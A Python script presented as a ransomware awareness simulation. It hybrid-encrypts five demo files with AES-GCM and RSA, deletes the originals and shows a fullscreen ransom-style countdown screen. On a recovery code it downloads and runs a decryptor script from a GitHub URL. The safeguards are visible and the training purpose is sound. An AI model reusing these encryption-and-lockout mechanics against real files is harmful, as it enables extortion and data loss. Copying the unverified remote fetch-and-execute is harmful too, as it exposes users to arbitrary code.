from pathlib import Path
from datetime import datetime, timedelta
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tkinter as tk
from urllib.request import urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes


# ============================================================
# CONTROLLED RANSOMWARE AWARENESS LAB
#
# Only the five explicitly listed files inside
# ~/Desktop/RansomDemo/targets are processed.
# ============================================================

ROOT = Path.home() / "Desktop" / "RansomDemo"

TARGET_DIR = ROOT / "targets"
BACKUP_DIR = ROOT / ".safety_backup"
RUNTIME_DIR = ROOT / ".runtime"

LOG_FILE = ROOT / "demo_log.txt"
CHECKSUM_FILE = ROOT / "checksums.json"

PRIVATE_KEY_FILE = RUNTIME_DIR / "private.pem"
PUBLIC_KEY_FILE = RUNTIME_DIR / "public.pem"
DECRYPTOR_FILE = RUNTIME_DIR / "demo_decrypt.py"

DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/demo_decrypt.py"
)

TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]

RECOVERY_CODE = "1234"

MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


# ============================================================
# BASIC UTILITIES
# ============================================================

def write_log(message):
    ROOT.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    line = f"{timestamp} {message}"

    print(line)

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as f:
        f.write(line + "\n")


def sha256_file(path):
    digest = hashlib.sha256()

    with path.open("rb") as f:
        while True:
            chunk = f.read(
                1024 * 1024
            )

            if not chunk:
                break

            digest.update(chunk)

    return digest.hexdigest()


def setup():
    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# RSA KEY GENERATION
# ============================================================

def generate_keys():
    if PRIVATE_KEY_FILE.exists():
        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():
            PUBLIC_KEY_FILE.write_bytes(
                private_key.publickey().export_key()
            )

        write_log(
            "[KEY] Existing RSA key pair loaded"
        )

        return

    write_log(
        "[KEY] Generating RSA-2048 training key pair"
    )

    key = RSA.generate(
        2048
    )

    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )

    PUBLIC_KEY_FILE.write_bytes(
        key.publickey().export_key()
    )

    try:
        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )

    except OSError:
        pass

    write_log(
        "[KEY] RSA key pair generated"
    )


# ============================================================
# SHA-256 BASELINE
# ============================================================

def save_original_checksums():
    checksums = {}

    for filename in TARGET_FILES:
        path = TARGET_DIR / filename

        if not path.exists():
            write_log(
                f"[HASH-ERROR] Missing source file: {filename}"
            )
            continue

        if path.is_symlink():
            write_log(
                f"[HASH-ERROR] Symlink rejected: {filename}"
            )
            continue

        digest = sha256_file(
            path
        )

        checksums[filename] = digest

        write_log(
            f"[HASH-BEFORE] {filename} {digest}"
        )

    CHECKSUM_FILE.write_text(
        json.dumps(
            checksums,
            indent=2
        ),
        encoding="utf-8"
    )

    write_log(
        "[HASH] SHA-256 baseline saved"
    )


# ============================================================
# ENCRYPTION
# ============================================================

def encrypt_file(filename):
    source = TARGET_DIR / filename

    encrypted = TARGET_DIR / (
        filename + ".unt"
    )

    backup = BACKUP_DIR / filename

    if source.is_symlink():
        write_log(
            f"[SKIP] Symlink rejected: {filename}"
        )

        return False

    if not source.exists():

        if encrypted.exists():
            write_log(
                f"[INFO] Already encrypted: {filename}"
            )

            return True

        write_log(
            f"[ERROR] Source file missing: {filename}"
        )

        return False

    # Avoid overwriting an existing encrypted file.
    if encrypted.exists():

        write_log(
            f"[ERROR] Both original and .unt exist: {filename}"
        )

        return False

    # Keep the first clean copy for lab safety.
    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )

        write_log(
            f"[BACKUP] {filename}"
        )

    plaintext = source.read_bytes()

    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )

    # AES-256: 32-byte random key.
    aes_key = get_random_bytes(
        32
    )

    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )

    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )

    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )

    encrypted_aes_key = (
        rsa_cipher.encrypt(
            aes_key
        )
    )

    temporary = TARGET_DIR / (
        filename + ".unt.tmp"
    )

    try:
        with temporary.open("wb") as f:

            # File identifier
            f.write(
                MAGIC
            )

            # RSA-wrapped AES key
            f.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )

            f.write(
                encrypted_aes_key
            )

            # AES-GCM nonce
            f.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )

            f.write(
                aes_cipher.nonce
            )

            # GCM authentication tag
            f.write(
                len(tag).to_bytes(
                    1,
                    "big"
                )
            )

            f.write(
                tag
            )

            # Ciphertext
            f.write(
                ciphertext
            )

        # Atomic move into final .unt name.
        os.replace(
            temporary,
            encrypted
        )

        # Remove visible plaintext only after
        # the encrypted file was successfully created.
        source.unlink()

        write_log(
            f"[ENCRYPTED] "
            f"{filename} -> {filename}.unt"
        )

        return True

    except Exception as error:

        if temporary.exists():
            temporary.unlink()

        write_log(
            f"[ENCRYPT-FAILED] "
            f"{filename}: {error}"
        )

        return False


def encrypt_all():
    successful = 0

    for filename in TARGET_FILES:

        if encrypt_file(
            filename
        ):
            successful += 1

    return successful


def verify_encrypted_state():
    for filename in TARGET_FILES:

        original = TARGET_DIR / filename

        encrypted = TARGET_DIR / (
            filename + ".unt"
        )

        if original.exists():

            write_log(
                f"[VERIFY-ERROR] "
                f"Plaintext still exists: {filename}"
            )

            return False

        if not encrypted.exists():

            write_log(
                f"[VERIFY-ERROR] "
                f"Encrypted file missing: {filename}.unt"
            )

            return False

    write_log(
        "[VERIFY] All 5 demo files are encrypted"
    )

    return True


# ============================================================
# DECRYPTOR DOWNLOAD
# ============================================================

def download_decryptor():
    write_log(
        "[RECOVERY] Downloading recovery utility"
    )

    with urlopen(
        DECRYPTOR_URL,
        timeout=15
    ) as response:

        data = response.read()

    if len(data) < 100:

        raise RuntimeError(
            "Downloaded recovery utility is unexpectedly small"
        )

    temporary = RUNTIME_DIR / (
        "demo_decrypt.py.tmp"
    )

    temporary.write_bytes(
        data
    )

    os.replace(
        temporary,
        DECRYPTOR_FILE
    )

    write_log(
        "[RECOVERY] Recovery utility downloaded"
    )


# ============================================================
# WARNING GUI
# ============================================================

def show_warning_window():
    root = tk.Tk()

    root.title(
        "Security Awareness Training"
    )

    root.configure(
        bg="#8b0000"
    )

    root.attributes(
        "-fullscreen",
        True
    )

    root.attributes(
        "-topmost",
        True
    )

    # Safety exit for the controlled lab.
    root.bind(
        "<Escape>",
        lambda event: root.destroy()
    )

    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )

    header = tk.Label(
        root,
        text="SECURITY AWARENESS TRAINING",
        font=(
            "Arial",
            30,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    header.pack(
        pady=(35, 5)
    )

    simulation_label = tk.Label(
        root,
        text="CONTROLLED RANSOMWARE SIMULATION",
        font=(
            "Arial",
            18,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    simulation_label.pack(
        pady=5
    )

    title = tk.Label(
        root,
        text="YOUR DEMO FILES HAVE BEEN ENCRYPTED",
        font=(
            "Arial",
            36,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    title.pack(
        pady=(25, 15)
    )

    information = tk.Label(
        root,
        text=(
            "5 / 5 training files encrypted\n\n"
            "Encryption: AES-256-GCM\n"
            "Key protection: RSA-2048 OAEP\n\n"
            "Only the controlled RansomDemo training directory "
            "was processed."
        ),
        font=(
            "Arial",
            16
        ),
        fg="white",
        bg="#8b0000",
        justify="center"
    )

    information.pack(
        pady=10
    )

    timer_title = tk.Label(
        root,
        text="TRAINING COUNTDOWN",
        font=(
            "Arial",
            15,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    timer_title.pack(
        pady=(10, 0)
    )

    timer_label = tk.Label(
        root,
        text="00:30:00",
        font=(
            "Courier",
            44,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    timer_label.pack(
        pady=3
    )

    # --------------------------------------------------------
    # VIEW ENCRYPTED FILES
    # --------------------------------------------------------

    def view_files():
        write_log(
            "[GUI] User opened encrypted files directory"
        )

        root.attributes(
            "-topmost",
            False
        )

        root.iconify()

        subprocess.Popen(
            [
                "xdg-open",
                str(TARGET_DIR)
            ]
        )

    view_button = tk.Button(
        root,
        text="VIEW ENCRYPTED FILES",
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=view_files,
        padx=20,
        pady=6
    )

    view_button.pack(
        pady=8
    )

    # --------------------------------------------------------
    # RECOVERY CODE
    # --------------------------------------------------------

    code_label = tk.Label(
        root,
        text="RECOVERY CODE",
        font=(
            "Arial",
            15,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )

    code_label.pack(
        pady=(5, 3)
    )

    code_entry = tk.Entry(
        root,
        font=(
            "Arial",
            21
        ),
        width=16,
        justify="center",
        show="*"
    )

    code_entry.pack(
        pady=4
    )

    code_entry.focus_set()

    status_label = tk.Label(
        root,
        text="",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )

    status_label.pack(
        pady=6
    )

    def recover():
        code = (
            code_entry
            .get()
            .strip()
        )

        if code != RECOVERY_CODE:

            write_log(
                "[RECOVERY] Invalid recovery code entered"
            )

            status_label.config(
                text="INVALID RECOVERY CODE"
            )

            code_entry.delete(
                0,
                tk.END
            )

            return

        write_log(
            "[RECOVERY] Valid recovery code accepted"
        )

        status_label.config(
            text="RECOVERY CODE ACCEPTED"
        )

        root.update_idletasks()

        try:
            status_label.config(
                text="DOWNLOADING RECOVERY UTILITY..."
            )

            root.update_idletasks()

            download_decryptor()

            status_label.config(
                text="STARTING FILE RECOVERY..."
            )

            root.update_idletasks()

            subprocess.Popen(
                [
                    sys.executable,
                    str(DECRYPTOR_FILE)
                ]
            )

            write_log(
                "[RECOVERY] Recovery utility launched"
            )

            root.destroy()

        except Exception as error:

            write_log(
                f"[RECOVERY-ERROR] {error}"
            )

            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )

    recovery_button = tk.Button(
        root,
        text="RECOVER FILES",
        font=(
            "Arial",
            16,
            "bold"
        ),
        command=recover,
        padx=25,
        pady=7
    )

    recovery_button.pack(
        pady=7
    )

    code_entry.bind(
        "<Return>",
        lambda event: recover()
    )

    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY  •  "
            "~/Desktop/RansomDemo/targets  •  "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            12
        ),
        fg="white",
        bg="#8b0000"
    )

    footer.pack(
        side="bottom",
        pady=15
    )

    # --------------------------------------------------------
    # COUNTDOWN
    # --------------------------------------------------------

    def update_timer():
        remaining = (
            end_time
            - datetime.now()
        )

        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )

        hours = (
            seconds // 3600
        )

        minutes = (
            seconds % 3600
        ) // 60

        secs = (
            seconds % 60
        )

        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{secs:02d}"
            )
        )

        if seconds > 0:
            root.after(
                1000,
                update_timer
            )

        else:
            status_label.config(
                text="TRAINING TIMER EXPIRED"
            )

            write_log(
                "[GUI] Training countdown expired"
            )

    update_timer()

    write_log(
        "[GUI] Warning screen displayed"
    )

    root.mainloop()


# ============================================================
# MAIN
# ============================================================

def main():
    setup()

    write_log(
        "=================================================="
    )

    write_log(
        "[START] Ransomware awareness simulation started"
    )

    generate_keys()

    save_original_checksums()

    successful = encrypt_all()

    write_log(
        f"[STATUS] Encryption completed: "
        f"{successful}/{len(TARGET_FILES)}"
    )

    if not verify_encrypted_state():

        write_log(
            "[ABORT] Encryption state incomplete"
        )

        print()
        print(
            "Not all demo files were encrypted."
        )

        print(
            "The warning screen will not be displayed."
        )

        return

    show_warning_window()


if __name__ == "__main__":
    main()
